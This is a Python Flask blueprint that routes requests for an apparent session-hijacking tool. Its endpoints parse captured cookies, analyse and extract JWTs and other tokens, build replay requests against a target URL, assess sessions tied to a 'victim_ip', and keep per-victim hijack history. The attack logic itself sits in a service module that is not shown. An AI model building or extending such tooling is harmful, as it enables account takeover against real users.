"""session_hijack blueprint (P3 batch extract; thinned at P4.6).

Business logic lives in ``app/services/osint.py`` (session_hijacker).
Response shapes are frozen and enforced by tests/char.
"""
from __future__ import annotations

import os, json, base64
import uuid as uuid_module
from datetime import datetime, timedelta
from functools import wraps
from flask import (Blueprint, request, jsonify, redirect, url_for, render_template, send_from_directory, make_response, session, Response)
from app.state import *  # noqa: F401,F403  -- P3
from app.state import BASE_DIR, CONFIG, _decode_data_url, _save_mobile_capture
import database as db
from app.services import osint as osintsvc

bp = Blueprint("session_hijack", __name__,
               template_folder=os.path.join(BASE_DIR, "flask_templates"))


@bp.route('/api/session-hijack/features', methods=['GET'])
def api_hijack_features():
    return jsonify(osintsvc.hijack_features())

@bp.route('/api/session-hijack/parse-cookies', methods=['POST'])
def api_hijack_cookies():
    data = request.get_json(force=True)
    return jsonify(osintsvc.parse_cookies(
        data.get('cookie_string'), data.get('cookie_list')))

@bp.route('/api/session-hijack/analyze-jwt', methods=['POST'])
def api_hijack_jwt():
    data = request.get_json(force=True)
    return jsonify(osintsvc.analyze_jwt(data.get('token', '')))

@bp.route('/api/session-hijack/extract-tokens', methods=['POST'])
def api_hijack_extract():
    data = request.get_json(force=True)
    return jsonify(osintsvc.extract_tokens(data))

@bp.route('/api/session-hijack/build-replay', methods=['POST'])
def api_hijack_replay():
    data = request.get_json(force=True)
    return jsonify(osintsvc.build_replay(
        data.get('cookies', []),
        data.get('target_url', 'https://target.example.com'),
        data.get('method', 'GET')))

@bp.route('/api/session-hijack/assess', methods=['POST'])
def api_hijack_assess():
    data = request.get_json(force=True)
    return jsonify(osintsvc.assess_session(
        data.get('cookies', []), data.get('jwt_tokens'),
        data.get('victim_ip', 'unknown'),
        session.get('IAm-logined', 'unknown'), request.remote_addr))

@bp.route('/api/session-hijack/history', methods=['GET'])
def api_hijack_history():
    victim_ip = request.args.get('victim_ip')
    return jsonify({'records': osintsvc.hijack_history(victim_ip)})

@bp.route('/api/session-hijack/<int:hijack_id>', methods=['DELETE'])
def api_hijack_delete(hijack_id):
    osintsvc.delete_hijack(hijack_id)
    return jsonify({'status': 'deleted'})
